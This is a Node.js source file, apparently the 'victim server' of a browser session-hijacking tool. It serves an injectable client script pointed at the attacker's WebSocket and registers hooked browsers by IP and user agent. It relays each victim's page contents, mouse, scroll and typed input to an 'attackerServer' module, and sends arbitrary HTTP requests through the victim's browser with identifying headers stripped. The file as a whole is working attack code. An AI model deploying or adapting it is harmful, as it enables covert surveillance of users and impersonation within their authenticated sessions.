const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const { execSync } = require('child_process');
const app = express();

const sslEnabled = getConfigValue('sslEnabled');
const port = getPort('victimServerPort');

let wss;

app.use(express.static(path.join(__dirname, 'public')));

function getPort(configKey) {
  const config = readConfig();
  return config[configKey];
}

function getConfigValue(configKey) {
  const config = readConfig();
  return config[configKey];
}

function readConfig() {
  let config;
  try {
    config = JSON.parse(fs.readFileSync('files/config.json'));
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('No configuration found. Running "npm run setPort" ...');
      execSync('npm run setPort', { stdio: 'inherit' });
      config = JSON.parse(fs.readFileSync('files/config.json'));
    } else {
      throw err;
    }
  }

  return config;
}

function filterHeaders(headers) {
  const forbiddenHeaders = [
    "shve-authentication",
    "shve",
    "host",
    "connection",
    "accept-encoding",
    "referer",
    "sec-fetch-dest",
    "sec-fetch-mode",
    "sec-fetch-site",
    "user-agent",
    "sec-ch-ua",
    "sec-ch-ua-mobile",
    "sec-ch-ua-platform",
    "sec-fetch-user",
    "content-length",
    "origin",    
  ];

  return Object.keys(headers)
  .filter((key) => !forbiddenHeaders.includes(key.toLowerCase()))
  .reduce((obj, key) => {
    obj[key] = headers[key];
    return obj;
  }, {});
}

app.use('/client', async function(req, res) {
  const scriptPath = path.join(__dirname, 'public', 'client.js');
  let script = fs.readFileSync(scriptPath, 'utf8');
  
  const wsProtocol = sslEnabled ? 'wss' : 'ws';
  const ip = req.query.ip;
  const port = await getPort('victimServerPort');

  script = script.replace("'{websocket_direction}'", `'${wsProtocol}://${ip}:${port}'`);

  res.setHeader('Content-Type', 'application/javascript');
  res.send(script);
});


app.get('/connect', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'connection.html'));
  });

  function startListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'on',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  function stopListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'off',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  function handleConnection(ws, req) {
      const clientId = uuidv4();
      ws.id = clientId;
      ws.userAgent = req.headers['user-agent'];
      ws.ip = req.socket.remoteAddress;

      console.log(`New client connected (ID: ${clientId})`);

      ws.on('close', () => {
        console.log(`Client ${ws.id} lost`);
      });

      ws.on('message', (message) => {
        handleMessage(ws.id, message);
      });
  }

function handleMessage(wsId, message) {
  const { writeDom, setMouse, setScroll, setInput } = require('./attackerServer');
  try {
    const parsedMessage = JSON.parse(message);
    if (parsedMessage.writeDom) {
      const { data, baseURL } = parsedMessage.writeDom;
      console.log(data)
      writeDom(wsId, data, baseURL);
    } else if (parsedMessage.setMouse) {
      const { mouseX, mouseY } = parsedMessage.setMouse;
      setMouse(wsId, mouseX, mouseY);
    } else if (parsedMessage.setScroll) {
      const { scrollY } = parsedMessage.setScroll;
      setScroll(wsId, scrollY);
    } else if (parsedMessage.setInput) {
      const { inputValue, inputPath } = parsedMessage.setInput;
      setInput(wsId, inputValue, inputPath);
    }
    
  } catch (error) {
    console.error(error);
  }
}

function getConnectedClients() {
  return Array.from(wss.clients)
    .filter(client => client.readyState === WebSocket.OPEN)
    .map(client => ({
      id: client.id,
      readyState: client.readyState,
      userAgent: client.userAgent,
      ip: client.ip,
    }));
}

function sendWebSocketRequest(wsId, method, url, headers = {}, postData = null) {
  const requestId = uuidv4();
  const cleanedHeaders = filterHeaders(headers);
  const data = {
    requestId,
    method,
    url,
    headers: cleanedHeaders,
  };
  if (postData) {
    data.data = postData;
  }
  const message = JSON.stringify({
    sendRequest: data,
  });

  const ws = Array.from(wss.clients).find((client) => client.id === wsId);
  if (ws) {
    return new Promise((resolve, reject) => {
      ws.send(message);

      const onResponse = (response) => {
        try {
          const responseData = JSON.parse(response);
          if (responseData.requestId === requestId) {
            ws.off('message', onResponse);
            if (responseData.error) {
              resolve(responseData);
            } else {
              resolve({
                data: responseData.data,
                headers: responseData.headers,
                status_code: responseData.status_code,
              });
            }
          }
        } catch (err) {
          reject({ error: err.message, statusCode: -1 });
        }
      };

      ws.on('message', onResponse);
    });
  } else {
    console.log(`Websocket ${wsId} not found`);
    return({ error: 'Websocket ' + wsId + ' not found', statusCode: -1 });
  }
}

module.exports = {
  startServer: () => {
    if (sslEnabled) {
      const privateKey = fs.readFileSync('files/privateKey.pem', 'utf8');
      const certificate = fs.readFileSync('files/certificate.pem', 'utf8');
      const credentials = { key: privateKey, cert: certificate };
      const httpsServer = https.createServer(credentials, app);
      wss = new WebSocket.Server({ server: httpsServer });
      httpsServer.listen(port, () => {
        console.log(`Victim server running on 0.0.0.0:${port} with SSL enabled`);
      });
    } else {
      const server = http.createServer(app);
      wss = new WebSocket.Server({ server });
      server.listen(port, () => {
        console.log(`Victim server running on 0.0.0.0:${port}`);
      });
    }
    wss.on('connection', handleConnection);
  },
  getConnectedClients,
  sendWebSocketRequest,
  startListening,
  stopListening,
};